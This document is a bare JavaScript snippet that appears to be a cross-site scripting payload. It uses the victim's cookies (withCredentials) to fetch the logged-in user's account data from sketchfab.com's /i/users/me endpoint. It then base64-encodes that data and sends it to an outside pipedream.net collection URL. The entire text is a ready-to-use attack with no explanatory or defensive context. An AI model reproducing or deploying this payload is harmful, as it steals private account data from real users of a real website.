  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      fetch("https://en2celr7rewbul.m.pipedream.net/?data="+ btoa(this.responseText));
    }
  };
  xhttp.open("GET", "https://sketchfab.com/i/users/me", true);
  xhttp.withCredentials = true;
  xhttp.send();
